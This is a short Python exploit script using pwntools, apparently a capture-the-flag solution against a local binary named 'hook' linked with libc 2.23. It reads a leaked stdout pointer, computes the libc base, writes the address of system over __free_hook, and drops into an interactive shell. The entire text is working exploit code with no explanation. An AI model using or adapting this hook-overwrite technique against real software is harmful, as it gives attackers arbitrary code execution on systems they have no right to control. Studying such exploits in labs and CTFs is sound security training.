from pwn import *

p = remote('127.0.0.1', 7182)
e = ELF('./hook', checksec=False)
libc = ELF('./libc-2.23.so', checksec=False)

p.recvuntil(b"stdout: ")
stdout = int(p.recv(14), 16)


libc_base = stdout - libc.sym['_IO_2_1_stdout_']
shell = libc_base + libc.sym['system'] #list(libc.search(b'/bin/sh'))[0]
free_hook = libc_base + libc.sym['__free_hook']

print("stdout ->", hex(stdout))
print("shell ->", hex(shell))

buf = p64(free_hook) + p64(shell)
p.sendlineafter(b"Size: ", str(len(buf)).encode())
p.sendlineafter(b"Data: ", buf)

p.interactive()